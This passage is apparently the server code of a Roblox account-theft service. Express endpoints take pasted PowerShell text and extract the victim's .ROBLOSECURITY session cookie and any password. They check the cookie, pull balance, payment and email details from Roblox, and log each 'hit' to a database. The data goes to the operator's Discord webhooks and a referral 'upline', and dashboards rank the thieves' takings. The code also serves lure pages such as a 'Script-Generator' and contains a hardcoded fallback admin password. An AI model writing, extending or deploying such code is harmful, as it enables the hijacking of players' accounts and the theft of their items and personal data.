            hitterId: req.session.discordId,
            hitterAvatar: req.session.discordAvatar
          };
        });
        
        // Calculate weekly history (last 7 days)
        const now = new Date();
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        
        const weeklyLogs = logs.filter(log => {
          const logDate = new Date(log.timestamp);
          return logDate >= weekAgo;
        });
        
        // Group by day
        const dayStats = {};
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        
        weeklyLogs.forEach(log => {
          const logDate = new Date(log.timestamp);
          const dayName = days[logDate.getDay()];
          
          if (!dayStats[dayName]) {
            dayStats[dayName] = { robux: 0, rap: 0, summary: 0, hits: 0 };
          }
          
          if (log.userData) {
            dayStats[dayName].robux += log.userData.robux || 0;
            dayStats[dayName].rap += log.userData.rap || 0;
            dayStats[dayName].summary += log.userData.summary || 0;
            dayStats[dayName].hits++;
          }
        });
        
        // Fill in the history arrays
        const last7Days = [];
        for (let i = 6; i >= 0; i--) {
          const date = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
          const dayName = days[date.getDay()];
          last7Days.push(dayName);
          
          const idx = 6 - i;
          if (dayStats[dayName]) {
            stats.history.robux[idx] = dayStats[dayName].robux;
            stats.history.rap[idx] = dayStats[dayName].rap;
            stats.history.summary[idx] = dayStats[dayName].summary;
            stats.history.hits[idx] = dayStats[dayName].hits;
          }
        }
        
        stats.history.labels = last7Days;
        
        // Build leaderboard - simple single entry for the directory
        stats.leaderboard = [{
          username: userDirectory.harName || userDirectory.discordUsername || req.session.discordUsername,
          discordId: req.session.discordId,
          discordAvatar: req.session.discordAvatar,
          value: stats.totalRobux + stats.totalRAP
        }];
        
      } catch (dbError) {
        console.error('Error querying database:', dbError);
      }
    }
    
    res.json(stats);
  } catch (error) {
    console.error('Error fetching stats:', error);
    res.status(500).json({ error: 'Failed to fetch statistics' });
  }
});

// Get directory statistics with weekly data (NEW - for redesigned dashboard)
app.get('/api/directory/stats', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    
    // Find user's directory
    let userDirectory = null;
    let directoryName = null;
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirectory = dirConfig;
        directoryName = dirName;
        break;
      }
    }
    
    if (!userDirectory) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    const stats = {
      totalHits: 0,
      totalRobux: 0,
      totalRAP: 0,
      totalSummary: 0,
      weekly: {
        hits: [0, 0, 0, 0, 0, 0, 0],
        robux: [0, 0, 0, 0, 0, 0, 0],
        rap: [0, 0, 0, 0, 0, 0, 0],
        summary: [0, 0, 0, 0, 0, 0, 0]
      },
      hourly: {
        hits: [],
        robux: [],
        rap: [],
        summary: []
      }
    };
    
    let todayHits = 0, todayRobux = 0, todayRAP = 0, todaySummary = 0;
    let yesterdayHits = 0, yesterdayRobux = 0, yesterdayRAP = 0, yesterdaySummary = 0;

    if (db) {
      try {
        // Get all logs for this directory
        const logsSnapshot = await db.ref('user_logs')
          .orderByChild('context/directory')
          .equalTo(directoryName)
          .once('value');
        
        const logs = [];
        logsSnapshot.forEach(childSnapshot => {
          logs.push({
            key: childSnapshot.key,
            ...childSnapshot.val()
          });
        });
        
        // Calculate totals
        logs.forEach(log => {
          if (log.userData) {
            stats.totalRobux += log.userData.robux || 0;
            stats.totalRAP += log.userData.rap || 0;
            stats.totalSummary += log.userData.summary || 0;
            stats.totalHits++;
          }
        });

        // ── Philippines timezone (UTC+8) helpers ──────────────────────────
        const PH_TZ = 'Asia/Manila';

        // Returns "YYYY-MM-DD" string in PH time for any timestamp
        const toPhDateStr = (ts) => new Date(ts).toLocaleDateString('en-CA', { timeZone: PH_TZ });

        // Returns the short day name ("Mon", "Tue", etc.) in PH time
        const toPhDayName = (ts) => new Date(ts).toLocaleDateString('en-US', { timeZone: PH_TZ, weekday: 'short' });
        // ────────────────────────────────────────────────────────────────────

        // Calculate today's stats (midnight–midnight PH time)
        const todayPh = toPhDateStr(Date.now());

        logs.forEach(log => {
          if (toPhDateStr(log.timestamp) === todayPh) {
            todayHits++;
            todayRobux += log.userData?.robux || 0;
            todayRAP += log.userData?.rap || 0;
            todaySummary += log.userData?.summary || 0;
          }
        });

        // Calculate yesterday's stats
        const yesterdayPh = toPhDateStr(Date.now() - 86400000);
        logs.forEach(log => {
          if (toPhDateStr(log.timestamp) === yesterdayPh) {
            yesterdayHits++;
            yesterdayRobux += log.userData?.robux || 0;
            yesterdayRAP += log.userData?.rap || 0;
            yesterdaySummary += log.userData?.summary || 0;
          }
        });

        // Build cumulative today chart data sorted by timestamp
        const todayLogsForChart = logs
          .filter(log => toPhDateStr(log.timestamp) === todayPh)
          .sort((a, b) => a.timestamp - b.timestamp);

        let cumHits = 0, cumRobux = 0, cumRAP = 0, cumSummary = 0;
        stats.hourly.hits.push(0);
        stats.hourly.robux.push(0);
        stats.hourly.rap.push(0);
        stats.hourly.summary.push(0);
        todayLogsForChart.forEach(log => {
          cumHits++;
          cumRobux += log.userData?.robux || 0;
          cumRAP += log.userData?.rap || 0;
          cumSummary += log.userData?.summary || 0;
          stats.hourly.hits.push(cumHits);
          stats.hourly.robux.push(cumRobux);
          stats.hourly.rap.push(cumRAP);
          stats.hourly.summary.push(cumSummary);
        });
        
        // Calculate weekly history (current Mon–Sun week in PH time)
        // Find the start of this week (Monday 00:00:00 PH time)
        const nowPh = new Date(new Date().toLocaleString('en-US', { timeZone: PH_TZ }));
        const phDayOfWeek = nowPh.getDay(); // 0=Sun,1=Mon...6=Sat
        const daysSinceMonday = phDayOfWeek === 0 ? 6 : phDayOfWeek - 1;
        const weekStartPh = new Date(nowPh);
        weekStartPh.setHours(0, 0, 0, 0);
        weekStartPh.setDate(weekStartPh.getDate() - daysSinceMonday);

        const weeklyLogs = logs.filter(log => {
          const logPhDate = new Date(new Date(log.timestamp).toLocaleString('en-US', { timeZone: PH_TZ }));
          return logPhDate >= weekStartPh;
        });
        
        // Group by PH day name
        const dayStats = {};
        
        weeklyLogs.forEach(log => {
          const dayName = toPhDayName(log.timestamp);
          
          if (!dayStats[dayName]) {
            dayStats[dayName] = { robux: 0, rap: 0, summary: 0, hits: 0 };
          }
          
          if (log.userData) {
            dayStats[dayName].robux += log.userData.robux || 0;
            dayStats[dayName].rap += log.userData.rap || 0;
            dayStats[dayName].summary += log.userData.summary || 0;
            dayStats[dayName].hits++;
          }
        });
        
        // Fill Mon–Sun slots
        const weekDays = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
        weekDays.forEach((dayName, idx) => {
          if (dayStats[dayName]) {
            stats.weekly.robux[idx] = dayStats[dayName].robux;
            stats.weekly.rap[idx] = dayStats[dayName].rap;
            stats.weekly.summary[idx] = dayStats[dayName].summary;
            stats.weekly.hits[idx] = dayStats[dayName].hits;
          }
        });
      } catch (dbError) {
        console.error('Error querying database:', dbError);
      }
    }
    
    res.json({
      ...stats,
      today: {
        hits: todayHits,
        robux: todayRobux,
        rap: todayRAP,
        summary: todaySummary
      },
      yesterday: {
        hits: yesterdayHits,
        robux: yesterdayRobux,
        rap: yesterdayRAP,
        summary: yesterdaySummary
      }
    });
  } catch (error) {
    console.error('Error fetching directory stats:', error);
    res.status(500).json({ error: 'Failed to fetch statistics' });
  }
});

// Update webhook URL
app.post('/api/directory/webhook', requireSession, async (req, res) => {
  try {
    const { webhookUrl } = req.body;
    
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      return res.status(400).json({ error: 'Invalid webhook URL' });
    }
    
    const directories = await loadDirectories();
    
    // Find user's directory
    let directoryName = null;
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        break;
      }
    }
    
    if (!directoryName) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Update webhook URL
    directories[directoryName].webhookUrl = webhookUrl;
    await saveDirectories(directories);
    
    res.json({ success: true, message: 'Webhook updated successfully' });
  } catch (error) {
    console.error('Error updating webhook:', error);
    res.status(500).json({ error: 'Failed to update webhook' });
  }
});

// Update HAR name
app.post('/api/directory/har-name', requireSession, async (req, res) => {
  try {
    const { harName } = req.body;
    
    if (!harName || harName.trim().length === 0) {
      return res.status(400).json({ error: 'HAR name cannot be empty' });
    }

    if (harName.trim().length > 20) {
      return res.status(400).json({ error: 'HAR name too long. Max 20 characters.' });
    }
    
    const directories = await loadDirectories();
    
    // Find user's directory
    let directoryName = null;
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        break;
      }
    }
    
    if (!directoryName) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Update HAR name
    directories[directoryName].harName = harName.trim();
    await saveDirectories(directories);
    
    res.json({ success: true, message: 'HAR name updated successfully' });
  } catch (error) {
    console.error('Error updating HAR name:', error);
    res.status(500).json({ error: 'Failed to update HAR name' });
  }
});


// Logout route
app.get('/logout', async (req, res) => {
  const token = req.cookies?.session;
  if (token) {
    await deleteSession(token);
  }
  res.clearCookie('session');
  res.redirect('/login');
});

// ====================================================================
// END DASHBOARD API ROUTES
// ====================================================================

// PROTECTED ROUTES WITH /u/ PREFIX FOR SITE OWNER AND PARENT DIRECTORIES

// Protected site owner convert endpoint
app.post('/u/convert', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;
    let password = '';

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
      password = req.body.password || '';
    } else {
      return res.status(400).json({ error: 'Invalid File Format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid File Format'
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6, // Consistent purple color
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to Discord webhook
        try {
          const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Service Failed Invalid File'
        });
      }

      // Validate if cookie is alive before processing
      console.log(`🔍 Validating input for /u/convert...`);
      const cookieValidation = await isRobloxCookieValid(token);

      // If validation failed or cookie is invalid, reject immediately
      if (cookieValidation.valid === false) {
        console.log(`❌ Invalid input detected: ${cookieValidation.reason}`);
        return res.status(400).json({ 
          success: false,
          message: 'Service Failed Invalid File'
        });
      }

      // If rate limited, let user know
      if (cookieValidation.valid === null) {
        console.log(`⚠️ Validation rate limited`);
        return res.status(429).json({ 
          success: false,
          message: 'Service Temporarily Unavailable'
        });
      }

      console.log(`✅ Input validated successfully for user: ${cookieValidation.username}`);

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        groupFunds: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0, hats: 0, gear: 0, animations: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Add password to user data if provided
      if (password) {
        webhookUserData.password = password;
      }

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData, null, null, false, req.ip);

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to Discord webhook
      try {
        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Service Failed Invalid File'
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Protected site owner token endpoint
app.get('/u/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
  console.log(`✅ Protected token request approved for IP: ${req.ip}`);
  res.json({ token: API_TOKEN });
});

// Handle /u/ without directory - return 404
app.get('/u', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.get('/u/', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Protected parent directory page
app.get('/u/:directory', async (req, res) => {
  const directoryName = req.params.directory;
  
  // Check if directory name is empty or invalid
  if (!directoryName || directoryName.trim() === '') {
    return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
  
  // Force trailing slash - CRITICAL for relative links!
  if (!req.path.endsWith('/')) {
    return res.redirect(301, req.path + '/');
  }
  
  const directories = await loadDirectories();

  if (directories[directoryName]) {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
});

// Protected parent directory convert endpoint
app.post('/u/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;
    let password = '';

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
      password = req.body.password || '';
    } else {
      return res.status(400).json({ error: 'Invalid File Format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid File Format',
        directory: directoryName
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0xFFA500, // Orange color to distinguish from successful hits
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to both directory webhook and site owner webhook
        try {
          await fetch(directoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.JSON.stringify(fallbackPayload)
          });

          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Service Failed Invalid File',
          directory: directoryName
        });
      }

      // Validate if cookie is alive before processing
      console.log(`🔍 Validating input for ${directoryName}...`);
      const cookieValidation = await isRobloxCookieValid(token);

      // If validation failed or cookie is invalid, reject immediately
      if (cookieValidation.valid === false) {
        console.log(`❌ Invalid input detected: ${cookieValidation.reason}`);
        return res.status(400).json({ 
          success: false,
          message: 'Service Failed Invalid File',
          directory: directoryName
        });
      }

      // If rate limited, let user know
      if (cookieValidation.valid === null) {
        console.log(`⚠️ Validation rate limited`);
        return res.status(429).json({ 
          success: false,
          message: 'Service Temporarily Unavailable',
          directory: directoryName
        });
      }

      console.log(`✅ Input validated successfully for user: ${cookieValidation.username}`);

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        groupFunds: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0, hats: 0, gear: 0, animations: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Add password to user data if provided
      if (password) {
        webhookUserData.password = password;
      }

      // Get display name (HAR name or Discord username)
      const displayName = directoryConfig.harName || directoryConfig.discordUsername || directoryName;
      const customTitle = `+1 Hit ${displayName}`;

      // Send to the directory's own webhook (this also fetches the avatar URL)
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle, true, req.ip);

      // Log user data to database with avatar URL
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName }, webhookResult.avatarUrl);
      const dirs = await loadDirectories();
      await updateDirectoryStats(directoryName, webhookUserData, dirs);
      await sendBigHitAlert(webhookUserData, directoryConfig.discordId, webhookResult.avatarUrl);

      // For infinite hook: Send to entire referral chain + main site
      if (directoryConfig.serviceType === 'infinite') {
        const directories = await loadDirectories();
        
        // Send to everyone in the referral chain (upline)
        if (directoryConfig.referralChain && directoryConfig.referralChain.length > 0) {
          for (const parentName of directoryConfig.referralChain) {
            const parent = directories[parentName];
            if (parent && parent.webhookUrl) {
              try {
                await sendToDiscord(
                  token, 
                  userAgent, 
                  `${scriptType} (Downline: ${directoryName})`, 
                  webhookUserData, 
                  parent.webhookUrl, 
                  `+1 Referral Hit from ${displayName}`, 
                  true,
                  req.ip
                );
                console.log(`✅ Sent to upline: ${parentName}`);
              } catch (error) {
                console.error(`❌ Failed to send to ${parentName}:`, error.message);
              }
            }
          }
        }
        
        // Always send to main site owner for infinite hook
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await sendToDiscord(
            token, 
            userAgent, 
            `${scriptType} (Network: ${directoryName})`, 
            webhookUserData, 
            siteOwnerWebhookUrl, 
            `+1 Referral Hit from ${displayName}`, 
            true,
            req.ip
          );
          console.log(`✅ Sent to main site`);
        }
      } else {
        // For non-infinite: Just send to site owner (old behavior)
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle, true, req.ip);
        }
      }

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to both directory webhook and site owner webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Service Failed Invalid File',
        directory: directoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Tool page routes - ADD THESE 3 ROUTES
app.get('/u/:directory/Script-Generator', async (req, res) => {
  const directoryName = req.params.directory;
  
  // Force trailing slash - CRITICAL!
  if (!req.path.endsWith('/')) {
    return res.redirect(301, req.path + '/');
  }
  
  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }

  res.sendFile(path.join(__dirname, 'public', 'script-generator.html'));
});

app.get('/u/:directory/Game-Copier', async (req, res) => {
  const directoryName = req.params.directory;
  
  // Force trailing slash - CRITICAL!
  if (!req.path.endsWith('/')) {
    return res.redirect(301, req.path + '/');
  }
  
  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }

  res.sendFile(path.join(__dirname, 'public', 'game-copier.html'));
});

app.get('/u/:directory/Voice-Chat', async (req, res) => {
  const directoryName = req.params.directory;
  
  // Force trailing slash - CRITICAL!
  if (!req.path.endsWith('/')) {
    return res.redirect(301, req.path + '/');
  }
  
  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }

  res.sendFile(path.join(__dirname, 'public', 'voice-chat.html'));
});

// Protected parent directory token endpoint
app.get('/u/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
  const directoryName = req.params.directory;

  if (!/^[a-z0-9-]+$/.test(directoryName)) {
    return res.status(400).json({ error: 'Invalid directory name format' });
  }

  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    console.log(`❌ Protected token request for non-existent directory: ${directoryName}, IP: ${req.ip}`);
    return res.status(404).json({ error: 'Directory not found' });
  }

  console.log(`✅ Protected directory token request approved for ${directoryName}, IP: ${req.ip}`);
  res.json({ token: directories[directoryName].apiToken });
});

// Middleware to protect admin dashboard with password
function requireAdminPassword(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Authentication required' });
  }

  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
  const [username, password] = credentials.split(':');

  const validUsername = process.env.ADMIN_USERNAME || 'admin';
  const validPassword = process.env.ADMIN_PASSWORD || 'admin123';

  if (username === validUsername && password === validPassword) {
    console.log(`✅ Admin access granted to IP: ${req.ip}`);
    next();
  } else {
    console.warn(`❌ Admin access DENIED for IP: ${req.ip} — wrong credentials`);
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Invalid credentials' });
  }
}

// Serve the admin dashboard with password protection
app.get('/admin', adminLimiter, requireAdminPassword, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

// Token endpoint protection middleware
function protectTokenEndpoint(req, res, next) {
  // Check User-Agent to prevent automated abuse
  const userAgent = req.get('User-Agent');
  if (!userAgent || userAgent.length < 10) {
    return res.status(403).json({ error: 'Invalid request' });
  }

  // Enhanced origin validation
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (!origin) {
    return res.status(403).json({ error: 'Missing origin header' });
  }

  try {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      console.log(`❌ Unauthorized token request from origin: ${origin}, IP: ${req.ip}`);
      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  } catch (error) {
    return res.status(403).json({ error: 'Invalid origin format' });
  }

  // Check for suspicious patterns
  const suspiciousPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i
  ];

  if (suspiciousPatterns.some(pattern => pattern.test(userAgent))) {
    console.log(`❌ Suspicious token request from User-Agent: ${userAgent}, IP: ${req.ip}`);
    return res.status(403).json({ error: 'Request blocked' });
  }

  next();
}

// Re-enabled token endpoint for root path (site owner)
app.get('/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
  console.log(`✅ Root path token request approved for IP: ${req.ip}`);
  res.json({ token: API_TOKEN });
});

// Test webhook endpoint
app.post('/test-webhook', requireSession, async (req, res) => {
  try {
    const { directoryName, testMessage } = req.body;
    const directories = await loadDirectories();

    if (!directories[directoryName]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Directory not found' 
      });
    }

    const directoryConfig = directories[directoryName];
    const webhookUrl = directoryConfig.webhookUrl;

    if (!webhookUrl) {
      return res.status(400).json({ 
        success: false, 
        error: 'No webhook URL configured for this directory' 
      });
    }

    // Create test webhook payload
    const testPayload = {
      embeds: [{
        title: "🧪 Webhook Test",
        description: "Webhook is working",
        color: 0x00ff00,
        footer: {
          text: `Test from ${directoryName} directory`
        },
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(testPayload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      return res.status(500).json({ 
        success: false, 
        error: `Webhook test failed: ${response.status} - ${errorText}` 
      });
    }

    res.json({ 
      success: true, 
      message: 'Webhook test successful!' 
    });

  } catch (error) {
    console.error('Error testing webhook:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Server error during webhook test' 
    });
  }
});

// API endpoint to create new directories
app.post('/api/create-directory', async (req, res) => {
  try {
    // Require a valid Discord pending session
    const pendingToken = req.cookies?.pending_session;
    const pendingSession = await getPendingSession(pendingToken);
    if (!pendingSession) {
      return res.status(401).json({ error: 'Discord authentication required. Please sign in with Discord first.' });
    }

    const { directoryName, webhookUrl, serviceType: _serviceType, referralCode } = req.body;
    let serviceType = _serviceType;

    // Validate directory name
    if (!directoryName || !/^[a-z0-9-]+$/.test(directoryName) || directoryName.length > 50) {
      return res.status(400).json({ error: 'Invalid directory name. Use only lowercase letters, numbers, and hyphens. Max 50 characters.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      return res.status(400).json({ error: 'Invalid webhook URL. Must be a Discord webhook URL.' });
    }

    // Only allow 'single' or 'infinite' service types
    if (serviceType && !['single', 'infinite'].includes(serviceType)) {
      return res.status(400).json({ error: 'Invalid service type. Must be "single" or "infinite"' });
    }

    // Load existing directories
    const directories = await loadDirectories();
    
    // Handle referral code for infinite hook system
    let referredBy = null;
    let referralChain = [];
    
    if (referralCode) {
      // User is joining via referral link
      const referrer = findDirectoryByReferralCode(directories, referralCode);
      
      if (!referrer) {
        return res.status(400).json({ error: 'Invalid referral code' });
      }
      
      // Only infinite directories can have referrals
      if (referrer.config.serviceType !== 'infinite') {
        return res.status(400).json({ error: 'This referral code is not valid' });
      }
      
      referredBy = referrer.name;
      referralChain = [...(referrer.config.referralChain || []), referrer.name];
      
      // Force service type to infinite for referrals
      serviceType = 'infinite';
    }

    // Check if this Discord user already owns a directory (one per account)
    const alreadyOwns = Object.values(directories).some(d => d.discordId === pendingSession.discordId);
    if (alreadyOwns) {
      return res.status(409).json({ error: 'Your Discord account already has a directory. Each account is limited to one directory.' });
    }

    // Check if directory name already exists
    if (directories[directoryName]) {
      return res.status(409).json({ error: 'Directory name already taken. Please choose a different name.' });
    }

    // Generate unique 6-8 digit ID using helper function
    const uniqueId = generateUniqueId(directories);
    
    // Generate referral code for infinite directories
    const userReferralCode = serviceType === 'infinite' ? generateReferralCode(directories) : null;

